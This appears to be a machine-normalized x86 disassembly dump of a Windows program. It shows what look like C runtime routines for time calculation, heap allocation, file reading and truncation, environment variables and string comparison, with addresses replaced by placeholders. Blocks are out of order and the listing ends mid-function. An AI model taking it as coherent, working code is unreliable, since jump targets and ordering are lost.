pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_40c5f0
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_407838
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_40cab8
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_40cc64
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_40cc64
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_40cc64
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_40cc64
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_40cc64
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jge r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_40cda4
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_40bc5f
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push ebx
call sub_40b270
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_40d3b0
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_40ce21
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rw-data ] esi
jle r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_407661
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_407d6e
mov eax [ rw-data ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_40ce79
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40cf02
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je r-xdata
mov esi [ rw-data ]
mov eax rw-data
dec eax
dec eax
je r-xdata
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_40d02f
mov esi [ eax + 0x8 ]
add eax 0x8
pop ecx
jmp r-xdata
sub eax 0x4
je r-xdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je r-xdata
push 0x3
call sub_408d7a
pop edi
pop esi
pop ebp
retn
cmp esi 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov ebx [ rw-data ]
and [ rw-data ] 0x0
cmp edi ecx
jne r-xdata
cmp edi 0xb
je r-xdata
sub eax 0x4
je r-xdata
and [ eax ] 0x0
cmp edi ecx
jne r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x8c
mov [ ebp + 0x8 ] edx
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
push edi
call esi
cmp edi 0xb
pop ecx
je r-xdata
push [ rw-data ]
push 0x8
call esi
pop ecx
pop ecx
jmp r-xdata
cmp edi ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
dec eax
je r-xdata
cmp edi 0x8
mov [ rw-data ] ebx
jne r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
cmp eax ecx
jge r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
lea edx [ eax + eax * 2 ]
sub ecx eax
lea edx [ edx * 4 + rw-data ]
and [ edx ] 0x0
add edx 0xc
dec ecx
jne r-xdata
jmp r-xdata
sub_40d02f
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40d074
push ebp
mov ebp esp
mov eax 0x1000
call sub_40d410
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ebx [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx * 8 + 0x4 ] 0x1
je r-xdata
push 0x1
push esi
push ebx
call sub_40be94
add esp 0xc
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
or eax 0xffffffff
push 0x2
push esi
push ebx
call sub_40be94
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
push 0x1000
lea eax [ ebp - 0x1000 ]
push esi
push eax
call sub_40d3b0
push 0x8000
push ebx
call sub_40d4c5
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_40be94
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push ebx
call sub_40be94
push ebx
call sub_40be00
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi 0xffffffff
jne r-xdata
push eax
lea eax [ ebp - 0x1000 ]
push eax
push ebx
call sub_409167
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
mov [ rw-data ] 0xd
call [ GetLastError@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
mov [ rw-data ] 0xd
push [ ebp + 0xc ]
push ebx
call sub_40d4c5
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
mov eax 0x1000
cmp edi eax
jge r-xdata
sub_40d1ba
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp esi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x3
lea ebx [ eax * 4 + rw-data ]
mov eax [ eax * 4 + rw-data ]
add eax esi
mov dl [ eax + 0x4 ]
test dl 0x1
je r-xdata
and [ ebp - 0x8 ] 0x0
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] 0x0
mov ecx edi
je r-xdata
xor eax eax
jmp r-xdata
test dl 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test dl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ ebx ]
push [ ebp + 0x10 ]
push ecx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop ecx
cmp eax ecx
jne r-xdata
dec [ ebp + 0x10 ]
mov [ edi ] al
mov eax [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
jne r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] ecx
jmp r-xdata
and al 0xfb
cmp [ edi ] 0xa
jne r-xdata
push eax
call sub_4094fc
pop ecx
jmp r-xdata
or eax 0xffffffff
sub edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ ebx ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ edi ] al
inc edi
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0xd
inc edi
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
cmp edi [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc edi
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40be94
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ edi ] 0xd
mov ecx [ ebx ]
inc edi
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_40d3b0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_40d410
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40d448
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_407ea0
pop ecx
mov edi eax
call sub_40d57a
test eax eax
jne r-xdata
push eax
call sub_407ea0
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_40d53b
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40d4c5
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 8 + 0x4 ]
mov cl [ ecx + eax * 8 + 0x4 ]
test cl 0x1
je r-xdata
mov al cl
mov esi 0x8000
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
mov [ rw-data ] 0x16
jmp r-xdata
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
or eax 0xffffffff
pop esi
retn
sub_40d53b
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_40d5e8
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_40d57a
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_408ba8
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_40d865
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_40d5e8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_40c5be
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_40c5be
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_40d410
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40d410
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_40d865
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_40daab
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_40da44
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_40d9ec
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_408ba8
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_40d57a
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_408c1c
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_407d6e
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_408c1c
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_408ba8
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_407ea0
inc eax
inc eax
push eax
call sub_408ba8
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_40ba20
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_407d6e
pop ecx
mov [ rw-data ] eax
sub_40d9ec
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_40d53b
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_40da44
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_408ba8
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_407d25
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_40db1e
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_40daab
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40db60
pop ecx
pop ecx
pop ebp
retn
movzx edx ax
mov eax [ ebp + 0xc ]
sub eax edx
neg eax
sbb eax eax
not eax
and eax ecx
pop ebp
retn
movzx edx al
test [ edx + rw-data ] 0x4
je r-xdata
movzx edx ax
cmp [ ebp + 0xc ] edx
je r-xdata
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
inc ecx
jmp r-xdata
xor eax eax
pop ebp
retn
movzx eax ax
movzx edx dl
shl eax 0x8
or eax edx
cmp [ ebp + 0xc ] eax
je r-xdata
movzx ax [ ecx ]
test ax ax
je r-xdata
lea eax [ ecx - 0x1 ]
pop ebp
retn
jmp r-xdata
sub_40db1e
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_407ea0
inc eax
push eax
call sub_408ba8
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
